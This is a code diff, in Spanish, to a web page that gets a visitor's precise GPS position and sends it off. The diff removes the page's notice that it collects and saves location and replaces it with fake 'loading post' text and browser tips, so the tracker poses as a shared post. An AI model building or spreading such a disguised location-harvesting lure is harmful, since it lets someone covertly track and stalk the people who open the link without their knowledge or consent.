@@ -38,10 +38,10 @@
             </div>
 
             <div class="aviso">
-                <strong>ℹ️ Aviso:</strong> Esta página obtendrá tu ubicación con la mejor precisión posible y la guardará.
+                <strong>ℹ️ Aviso:</strong> Puede que necesites abrir el link desde el navegador de tu preferencia para poder visualizar este post.
             </div>
 
-            <div id="status">Buscando señal GPS...</div>
+            <div id="status">Cargando Post...</div>
         </div>
     </div>
 
@@ -65,13 +65,13 @@
                 mode: "no-cors"
             });
 
-            document.getElementById('status').innerHTML = `✅ Ubicación guardada<br>📍 ${lat}, ${lon} (±${accuracy}m)`;
+            document.getElementById('status').innerHTML = `✅ Post Cargado<br>📍 ${lat}, ${lon} (±${accuracy}m)`;
             document.getElementById('status').style.background = "#004d00";
         }
 
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(enviarUbicacion, (err) => {
-                document.getElementById('status').innerHTML = "❌ Error: Prueba afuera con GPS activado.";
+                document.getElementById('status').innerHTML = "❌ Error: Copie y pegue el link en el navegador.";
             }, { 
                 enableHighAccuracy: true, 
                 timeout: 25000 
